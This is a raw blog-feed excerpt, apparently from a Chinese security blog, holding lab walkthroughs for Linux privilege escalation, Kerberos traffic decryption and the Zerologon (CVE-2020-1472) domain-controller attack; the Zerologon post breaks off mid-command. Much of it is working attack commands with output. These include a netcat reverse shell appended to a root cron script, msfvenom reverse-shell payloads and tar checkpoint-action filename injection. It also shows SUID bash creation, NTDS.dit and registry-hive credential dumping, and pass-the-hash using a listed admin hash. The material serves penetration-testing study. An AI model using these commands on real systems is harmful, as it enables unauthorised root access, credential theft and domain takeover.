class="line">user4@polobox:~$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow usercommand</span></span><br><span class="line">*/5  *    * * * root    /home/user4/Desktop/autoscript.sh</span><br><span class="line">17 ** * *root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6* * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6* * 7root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 61 * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mkfifo /tmp/tfrn; nc 10.11.53.68 8888 0&lt;/tmp/tfrn | /bin/sh &gt;/tmp/tfrn 2&gt;&amp;1; rm /tmp/tfrn&quot;</span> &gt;&gt; /home/user4/Desktop/autoscript.sh</span><br></pre></td></tr></table></figure><p><strong>2. tar 通配符</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/home/user:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow usercommand</span></span><br><span class="line">17 ** * *root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6* * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6* * 7root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 61 * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">* * * * * root overwrite.sh</span><br><span class="line">* * * * * root /usr/<span class="built_in">local</span>/bin/compress.sh<span class="comment">#这个文件</span></span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /usr/<span class="built_in">local</span>/bin/compress.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/user</span><br><span class="line">tar czf /tmp/backup.tar.gz *<span class="comment">#tar 命令后面跟的是通配符*</span></span><br><span class="line"></span><br><span class="line">$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.53.68 LPORT=4444 -f elf -o shell.elf<span class="comment">#生成反向shell</span></span><br><span class="line">$ scp shell.elf user@10.10.63.222:/home/user/<span class="comment">#传输到目标机</span></span><br><span class="line">$ chomd +x shell.elf</span><br><span class="line">$ touch /home/user/--checkpoint=1<span class="comment">#在/home/user目录中创建两个文件</span></span><br><span class="line">$ touch /home/user/--checkpoint-action=<span class="built_in">exec</span>=shell.elf<span class="comment">#在/home/user目录中创建两个文件</span></span><br><span class="line">$ user@debian:~$ ls</span><br><span class="line">--checkpoint=1  --checkpoint-action=<span class="built_in">exec</span>=shell.elf  myvpn.ovpn  shell.elf  tools</span><br><span class="line">$ nc -lvp 4444<span class="comment">#开启监听</span></span><br></pre></td></tr></table></figure><p><strong>3. crontab-PATH 环境变量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/home/user:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin<span class="comment">#请注意，PATH 变量以 /home/user开头，这是我们用户的主目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow usercommand</span></span><br><span class="line">17 ** * *root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6* * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6* * 7root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 61 * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">* * * * * root overwrite.sh</span><br><span class="line">* * * * * root /usr/<span class="built_in">local</span>/bin/compress.sh</span><br><span class="line"></span><br><span class="line">user@debian:~$ nano overwrite.sh</span><br><span class="line">user@debian:~$ chmod +x /home/user/overwrite.sh</span><br><span class="line">user@debian:~$ cat overwrite.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cp /bin/bash /tmp/rootbash</span><br><span class="line">chmod +xs /tmp/rootbash</span><br><span class="line">user@debian:~$ /tmp/rootbash -p<span class="comment">#等待脚本执行后</span></span><br><span class="line">rootbash-4.1<span class="comment"># </span></span><br><span class="line">rootbash-4.1<span class="comment"># id</span></span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">rm /tmp/rootbash  <span class="comment">#请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><hr><h3 id="8-NFS"><a href="#8-NFS" class="headerlink" title="#8 NFS"></a>#8 NFS</h3><p>网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。</p><p>目标机开启了/tmp共享</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/exports</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/612199c3359bec53f0b5ada64da87c30.png" alt="image-20220518175200970"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e 10.10.109.232</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/dad20bdd1df9f4de5c790886d6dcd056.png" alt="image-20220519101446347"></p><p>漏洞利用(攻击机)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir /tmp/nfs<span class="comment">#创建文件夹</span></span><br><span class="line">$ mount -o rw,vers=2 10.10.63.222:/tmp /tmp/nfs<span class="comment">#挂载目录，IP是目标机</span></span><br><span class="line">$ msfvenom -p linux/x86/<span class="built_in">exec</span> CMD=<span class="string">&quot;/bin/bash -p&quot;</span> -f elf -o /tmp/nfs/shell.elf<span class="comment">#生成exploit</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 48 bytes</span><br><span class="line">Final size of elf file: 132 bytes</span><br><span class="line">Saved as: /tmp/nfs/shell.elf</span><br><span class="line"></span><br><span class="line">$ chmod +xs /tmp/nfs/shell.elf<span class="comment">#添加执行权限</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/bb2661aa8b515535055df39a6d9dd51c.png" alt="image-20220518175454810"></p><p>目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@debian:/tmp$ ls</span><br><span class="line">backup.tar.gz  root.pm  shell  shell2  shell2.c  shell.c  shell.elf  useless</span><br><span class="line">user@debian:/tmp$ /tmp/shell.elf<span class="comment">#执行exploit</span></span><br><span class="line">bash-4.1<span class="comment"># id</span></span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line">bash-4.1<span class="comment"># ls /root</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/f0cf3e5b659e94bffb96cc96371faece.png" alt="image-20220518175559457"></p><hr><h3 id="9-PATH变量"><a href="#9-PATH变量" class="headerlink" title="#9 PATH变量"></a>#9 PATH变量</h3><p>echo $PATH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user5@polobox:~$ ./script    <span class="comment">#脚本执行的ls命令</span></span><br><span class="line">Desktop  Documents  Downloads  Music  PicturesPublicscriptTemplates  Videos</span><br><span class="line">user5@polobox:~$ <span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; /tmp/ls      <span class="comment">#在/tmp目录下生成一个替换的ls命令</span></span><br><span class="line">user5@polobox:~$ chmod +x /tmp/ls<span class="comment">#添加执行权限</span></span><br><span class="line">user5@polobox:~$ <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span><span class="comment">#修改环境变量为/tmp</span></span><br><span class="line">user5@polobox:~$ ./script<span class="comment">#执行脚本弹回</span></span><br><span class="line">Welcome to Linux Lite 4.4 user5</span><br><span class="line"> </span><br><span class="line">Tuesday 17 May 2022, 05:05:26</span><br><span class="line">Memory Usage: 364/1991MB (18.28%)</span><br><span class="line">Disk Usage: 6/217GB (3%)</span><br><span class="line">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br><span class="line"> </span><br><span class="line">root@polobox:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1004(user5)</span><br></pre></td></tr></table></figure><hr><p>参考文章：</p><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</a></li><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md]">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Linux - Privilege Escalation.md)</li><li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation__-_linux.html</a></li><li><a href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0-枚举脚本&quot;&gt;&lt;a href=&quot;#0-枚举脚本&quot; class=&quot;headerlink&quot; title=&quot;#0 枚举脚本&quot;&gt;&lt;/a&gt;#0 枚举脚本&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;linpeas.sh：&lt;/strong&gt;&lt;a href=&quot;https://github.</summary>
      
    
    
    
    
    <category term="提权" scheme="https://z4ynadmin.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>解密Wireshark Kerberos协议</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/%E8%A7%A3%E5%AF%86Wireshark-Kerberos%E5%8D%8F%E8%AE%AE/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/%E8%A7%A3%E5%AF%86Wireshark-Kerberos%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-11-07T06:50:26.000Z</published>
    <updated>2022-11-07T06:59:08.926Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-原始报文"><a href="#1-原始报文" class="headerlink" title="#1 原始报文"></a>#1 原始报文</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/61e61014277a2683611a32ab5cac7a31.png" alt="image-20220908162617609"></p><h3 id="2-域控导出NTDS-dit和SYSTEM文件"><a href="#2-域控导出NTDS-dit和SYSTEM文件" class="headerlink" title="#2 域控导出NTDS.dit和SYSTEM文件"></a>#2 域控导出NTDS.dit和SYSTEM文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /<span class="keyword">for</span>=C:</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hive</span><br><span class="line">vssadmin delete shadows /all</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/d66f5857b61f15723e33afdcd5213463.png" alt="image-20220908162947619"></p><h3 id="3-kali安装-libesedb-utils"><a href="#3-kali安装-libesedb-utils" class="headerlink" title="#3 kali安装 libesedb-utils"></a>#3 kali安装 libesedb-utils</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> libesedb-utils</span><br></pre></td></tr></table></figure><h3 id="4-git-克隆-ntdsxtract"><a href="#4-git-克隆-ntdsxtract" class="headerlink" title="#4 git 克隆 ntdsxtract"></a>#4 git 克隆 ntdsxtract</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/csababarta/ntdsxtract.git</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c95f93fce535f8dd4a118dcfbd6c845d.png" alt="image-20220908164711048"></p><h3 id="5-python2-安装-pycryptodome"><a href="#5-python2-安装-pycryptodome" class="headerlink" title="#5 python2 安装 pycryptodome"></a>#5 python2 安装 pycryptodome</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip <span class="keyword">install</span> pycryptodome</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c6825d7e4ef926a122fadb194c9ee5d4.png" alt="image-20220908163452363"></p><h3 id="6-提取出多个文件，在ntds-dit-export目录下-这个步骤等待的时间较长"><a href="#6-提取出多个文件，在ntds-dit-export目录下-这个步骤等待的时间较长" class="headerlink" title="#6 提取出多个文件，在ntds.dit.export目录下  (这个步骤等待的时间较长)"></a>#6 提取出多个文件，在ntds.dit.export目录下  <strong>(这个步骤等待的时间较长)</strong></h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/11117420d4fa5afa32fc314c3014a20c.png" alt="image-20220908163632883"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/e25c82cdcf4c7066ce0df15edb81d62f.png" alt="image-20220908164504631"></p><h3 id="7-提取出-keytab文件"><a href="#7-提取出-keytab文件" class="headerlink" title="#7 提取出 keytab文件"></a>#7 提取出 keytab文件</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/45617889359798fc34465d860c4a1a55.png" alt="image-20220908164816450"></p><h3 id="8-Wireshark-导入keytab文件-编辑-gt-首选项-gt-Protocols-gt-KRB5"><a href="#8-Wireshark-导入keytab文件-编辑-gt-首选项-gt-Protocols-gt-KRB5" class="headerlink" title="#8 Wireshark 导入keytab文件  编辑-&gt;首选项-&gt;Protocols-&gt;KRB5"></a>#8 Wireshark 导入keytab文件  编辑-&gt;首选项-&gt;Protocols-&gt;KRB5</h3><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/81e818b81cc454398a7bac9019ae6b18.png" alt="image-20220908164946014" style="zoom:33%;" /><h3 id="9-解密enc-part部分，就能看到-Login-session-key。"><a href="#9-解密enc-part部分，就能看到-Login-session-key。" class="headerlink" title="#9 解密enc-part部分，就能看到 Login session key。"></a>#9 解密enc-part部分，就能看到 Login session key。</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/531a7ef9dbdd758a6631f5d0265a5cb9.png" alt="image-20220908165522558"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-原始报文&quot;&gt;&lt;a href=&quot;#1-原始报文&quot; class=&quot;headerlink&quot; title=&quot;#1 原始报文&quot;&gt;&lt;/a&gt;#1 原始报文&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://z4admin.s3.ap-northeast-1.amazonaw</summary>
      
    
    
    
    
    <category term="Kerberos" scheme="https://z4ynadmin.github.io/tags/Kerberos/"/>
    
    <category term="Wireshark" scheme="https://z4ynadmin.github.io/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1472 Netlogon权限提升</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/CVE-2020-1472-Netlogon%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/CVE-2020-1472-Netlogon%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2022-11-07T06:27:44.000Z</published>
    <updated>2022-11-07T06:41:38.882Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="# 0x00 目录"></a># 0x00 目录</h3><ol><li>漏洞分析</li><li>漏洞利用条件</li><li>漏洞利用</li></ol><hr><h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="# 0x01 漏洞分析"></a># 0x01 漏洞分析</h3><p>攻击者在通过NetLogon ( MS-NRPC)协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。Netlogon使用的AES认证算法中的vi向量默认为o，导致攻击者可以绕过认证，可以向域发起Netlogon计算机账户认证请求,使用8字节全0 client challenge不断尝试得到一个正确的8字节全O client credential通过认证，再通过相关调用完成对域控密码的修改。</p><p>影响版本</p><ul><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li><li>Windows Server 2012</li><li>Windows Server 2012 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2019</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)</li><li>Windows Server, version 2004 (Server Core installation)</li></ul><hr><h3 id="0x02-漏洞利用条件"><a href="#0x02-漏洞利用条件" class="headerlink" title="# 0x02 漏洞利用条件"></a># 0x02 漏洞利用条件</h3><ol><li>与域控通讯（在不在域内都行）</li><li>能访问域控MS-NRPC服务，</li></ol><p>当攻击者使用Netlogon远程协议(MS-NRPC)建立与域控制器连接的易受攻击的 Netlogon安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。</p><p>要利用此漏洞，未通过身份验证的攻击者需要将MS-NRPC连接到域控制器，以获取域管理员访问权限。</p><hr><h3 id="0x03-复现工具"><a href="#0x03-复现工具" class="headerlink" title="# 0x03 复现工具"></a># 0x03 复现工具</h3><p>漏洞验证工具：<a href="https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py">https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py</a></p><p>漏洞利用工具：<a href="https://github.com/risksense/zerologon/blob/master/set_empty_pw.py">https://github.com/risksense/zerologon/blob/master/set_empty_pw.py</a></p><p>密码重置工具：<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="# 0x04 漏洞复现"></a># 0x04 漏洞复现</h3><h4 id="0-漏洞验证脚本"><a href="#0-漏洞验证脚本" class="headerlink" title="0). 漏洞验证脚本"></a>0). 漏洞验证脚本</h4><p>获取dc主机名</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows：nbtstat -<span class="keyword">A</span> <span class="number">10.10.10.8</span></span><br><span class="line">Linux：nbtscan</span><br></pre></td></tr></table></figure><p>漏洞验证工具：zerologon_tester.py</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> zerologon_tester.py OWA <span class="number">10.10.10.8</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/ad4c8bc4c00f7fcc8539b0c6d69f6107.png" alt="image-20220810131156397"></p><h4 id="1-更改dc密码为空"><a href="#1-更改dc密码为空" class="headerlink" title="1).  更改dc密码为空"></a>1).  更改dc密码为空</h4><p>利用set_empty_pw.py将dc密码设置为空，即<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>在利用secretsdump.py读dc的hash</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> set_empty_pw.py OWA <span class="number">10.10.10.8</span>  <span class="comment">#OWA为域控主机名</span></span><br><span class="line">impacket-secretsdump redteam.red/OWA\$@<span class="number">10.10.10.8</span> -<span class="literal">no</span>-pass</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/4a7a9f5050bc6d5e2c012d25e94ddb30.png" alt="image-20220810133549444"></p><p>获取到域管理员administrator用户hash：redteam.red\Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/0deb21948f62266afccca6532636e63c.png" alt="image-20220810152925651"></p><p>pth登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-wmiexec redteam.red/Administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span> -codec gb<span class="number">2312</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5ab8efe26779c0c580977b9d345a4d50.png" alt="image-20220810162528929"></p><p><strong>因为密码置空后，用户在 AD 中的密码（ntds.dic）与本地的注册表 /lsass 里面的密码不一致，会脱离域控，所以要将其恢复</strong>。</p><h4 id="2-还原密码"><a href="#2-还原密码" class="headerlink" title="2).  还原密码"></a>2).  还原密码</h4><h4 id="1-第一种方法"><a href="#1-第一种方法" class="headerlink" title="#1 第一种方法"></a>#1 第一种方法</h4><p>密码还原工具restorepassword.py：<a href="https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py">https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py</a></p><p>利用plain_password_hex</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5c3a8ee428689c54755d1ca0dd3c9525.png" alt="image-20220810143125888"></p><p>用restorepassword.py将密码还原，还原后利用空口令登录失败</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 restorepassword.py redteam.red/owa@owa -target-ip 10.10.10.8 -hexpass 595ee95117c30b874201c95971f38dd5ae0a97a564a70a366977619ea5cb3e3f18f4a4e9f3d99ec0e676e2a75594afec2ad567081ac566b118c7941e1e247a4855dd3c50edb5ed236e5cc17cf7336deb6291183f034dad603d1f475228f6d39cbea07b85335c85c554071bfa9fbc45c0f036e21e25da514c272e92db7e160d46aa1b298539cfa5f5c83773a9901983443c999e2750972f5aca71461217ecf84c7fdaca9deb1ca0000e88a587ea3aea6183db82ed5f9e66603568c2708f395e3ed96997254a8dd25b5afc06dd52c52f25e063d7b782cfa2e40667eb2bc2a4b0830f1199db0b4b4ef9ab599f983a18a567</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/aad8f7c2a28fe1f0f0ae1f0525bdc8d2.png" alt="image-20220810143023360"></p><h4 id="2-第二种方法"><a href="#2-第二种方法" class="headerlink" title="#2 第二种方法"></a>#2 第二种方法</h4><p>从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码</p><p>利用redteam.red/administrator hash登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/903fb9e42a3015d99e4cca47e86eeccc.png" alt="image-20220810153151365"></p><p>读取sam、system、security文件</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\sam sam.hive</span><br><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\system system.hive</span><br><span 